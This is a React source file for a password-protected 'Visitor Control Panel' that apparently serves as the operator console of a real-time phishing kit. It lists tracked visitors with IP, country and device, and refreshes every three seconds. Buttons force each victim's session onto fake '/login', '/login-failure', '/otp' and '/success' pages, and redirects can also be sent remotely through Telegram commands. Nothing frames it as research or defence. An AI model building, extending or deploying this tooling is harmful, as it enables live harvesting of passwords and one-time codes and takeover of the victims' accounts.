import { useState } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import type { Visitor } from "@shared/schema";

export default function Admin() {
  const [password, setPassword] = useState("");
  const [authToken, setAuthToken] = useState<string | null>(null);
  const [customPages, setCustomPages] = useState<Record<string, string>>({});
  const queryClient = useQueryClient();

  // Authenticate with password via server
  const handleAuth = async (e: React.FormEvent) => {
    e.preventDefault();
    
    try {
      const response = await fetch("/api/admin/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password }),
      });
      
      if (response.ok) {
        const data = await response.json();
        setAuthToken(data.token); // Store server-issued token
        setPassword(""); // Clear password from memory
      } else {
        alert("Incorrect password");
      }
    } catch (error) {
      alert("Login failed - please try again");
    }
  };

  // Custom fetch with auth header
  const authenticatedFetch = async (url: string, options: RequestInit = {}) => {
    const headers = {
      ...options.headers,
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${authToken}`,
    };
    
    const response = await fetch(url, { ...options, headers });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    return response;
  };

  // Fetch all visitors with auth
  const { data, isLoading } = useQuery<{ visitors: Visitor[] }>({
    queryKey: ["/api/admin/visitors"],
    queryFn: async () => {
      const response = await authenticatedFetch("/api/admin/visitors");
      return response.json();
    },
    enabled: !!authToken,
    refetchInterval: 3000, // Auto-refresh every 3 seconds
  });

  // Redirect mutation with auth
  const redirectMutation = useMutation({
    mutationFn: async ({ sessionId, redirectTarget }: { sessionId: string; redirectTarget: string }) => {
      const response = await authenticatedFetch("/api/admin/redirect", {
        method: "POST",
        body: JSON.stringify({ sessionId, redirectTarget }),
      });
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/visitors"] });
    },
  });

  const handleRedirect = (sessionId: string, page: string) => {
    if (confirm(`Redirect this visitor to ${page}?`)) {
      redirectMutation.mutate({ sessionId, redirectTarget: page });
    }
  };

  const handleCustomRedirect = (sessionId: string, visitorId: number) => {
    const customPage = customPages[visitorId];
    if (!customPage) {
      alert("Please enter a page path");
      return;
    }
    if (!customPage.startsWith('/')) {
      alert("Page path must start with /");
      return;
    }
    redirectMutation.mutate({ sessionId, redirectTarget: customPage });
    setCustomPages({ ...customPages, [visitorId]: "" }); // Clear after redirect
  };

  if (!authToken) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-100">
        <div className="bg-white p-8 rounded-lg shadow-md w-full max-w-md">
          <h1 className="text-2xl font-bold mb-6">Admin Login</h1>
          <form onSubmit={handleAuth}>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter admin password"
              className="w-full px-4 py-2 border rounded-md mb-4"
              data-testid="input-admin-password"
            />
            <button
              type="submit"
              className="w-full bg-black text-white py-2 rounded-md hover:bg-gray-800"
              data-testid="button-admin-login"
            >
              Login
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100 p-8">
      <div className="max-w-7xl mx-auto">
        <div className="flex justify-between items-center mb-8">
          <h1 className="text-3xl font-bold">Visitor Control Panel</h1>
          <button
            onClick={() => setAuthToken(null)}
            className="px-4 py-2 bg-red-500 text-white rounded-md hover:bg-red-600"
            data-testid="button-logout"
          >
            Logout
          </button>
        </div>

        {isLoading ? (
          <div className="text-center py-12">Loading visitors...</div>
        ) : (
          <div className="bg-white rounded-lg shadow-md overflow-hidden">
            <table className="w-full">
              <thead className="bg-gray-50 border-b">
                <tr>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Session</th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">IP</th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Country</th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Device</th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Browser</th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Current Page</th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Last Seen</th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-200">
                {data?.visitors.map((visitor) => (
                  <tr key={visitor.id} className="hover:bg-gray-50">
                    <td className="px-6 py-4 text-sm text-gray-500 font-mono">
                      {visitor.sessionId.substring(0, 8)}...
                    </td>
                    <td className="px-6 py-4 text-sm text-gray-900">{visitor.ip}</td>
                    <td className="px-6 py-4 text-sm text-gray-900">{visitor.country}</td>
                    <td className="px-6 py-4 text-sm text-gray-900">{visitor.device}</td>
                    <td className="px-6 py-4 text-sm text-gray-900">{visitor.browser}</td>
                    <td className="px-6 py-4 text-sm text-gray-900">{visitor.currentPage}</td>
                    <td className="px-6 py-4 text-sm text-gray-500">
                      {new Date(visitor.lastSeen).toLocaleString()}
                    </td>
                    <td className="px-6 py-4 text-sm">
                      <div className="space-y-2">
                        <div className="flex flex-wrap gap-2">
                          <button
                            onClick={() => handleRedirect(visitor.sessionId, "/login")}
                            className="px-3 py-1 bg-blue-500 text-white rounded text-xs hover:bg-blue-600"
                            data-testid={`button-redirect-login-${visitor.id}`}
                          >
                            → Login
                          </button>
                          <button
                            onClick={() => handleRedirect(visitor.sessionId, "/login-failure")}
                            className="px-3 py-1 bg-red-500 text-white rounded text-xs hover:bg-red-600"
                            data-testid={`button-redirect-failure-${visitor.id}`}
                          >
                            → Failure
                          </button>
                          <button
                            onClick={() => handleRedirect(visitor.sessionId, "/otp")}
                            className="px-3 py-1 bg-green-500 text-white rounded text-xs hover:bg-green-600"
                            data-testid={`button-redirect-otp-${visitor.id}`}
                          >
                            → OTP
                          </button>
                          <button
                            onClick={() => handleRedirect(visitor.sessionId, "/success")}
                            className="px-3 py-1 bg-purple-500 text-white rounded text-xs hover:bg-purple-600"
                            data-testid={`button-redirect-success-${visitor.id}`}
                          >
                            → Success
                          </button>
                        </div>
                        <div className="flex gap-2 items-center">
                          <input
                            type="text"
                            value={customPages[visitor.id] || ""}
                            onChange={(e) => setCustomPages({ ...customPages, [visitor.id]: e.target.value })}
                            placeholder="Custom path (e.g., /any-page)"
                            className="flex-1 px-2 py-1 border rounded text-xs"
                            data-testid={`input-custom-page-${visitor.id}`}
                          />
                          <button
                            onClick={() => handleCustomRedirect(visitor.sessionId, visitor.id)}
                            className="px-3 py-1 bg-gray-700 text-white rounded text-xs hover:bg-gray-800"
                            data-testid={`button-redirect-custom-${visitor.id}`}
                          >
                            → Go
                          </button>
                        </div>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>

            {data?.visitors.length === 0 && (
              <div className="text-center py-12 text-gray-500">
                No visitors yet. Waiting for connections...
              </div>
            )}
          </div>
        )}

        <div className="mt-8 bg-white rounded-lg shadow-md p-6">
          <h2 className="text-xl font-bold mb-4">Instructions</h2>
          <ul className="list-disc list-inside space-y-2 text-gray-700">
            <li>Visitors are tracked automatically when they visit the login page</li>
            <li>Click any quick redirect button to send a visitor to that page</li>
            <li>Use the custom input to redirect to ANY page path (e.g., /custom-page, /any/path)</li>
            <li>The visitor will be redirected within 2 seconds</li>
            <li>Use Telegram commands to control visitors remotely: <code>/redirect &lt;session&gt; &lt;page&gt;</code></li>
          </ul>
        </div>
      </div>
    </div>
  );
}
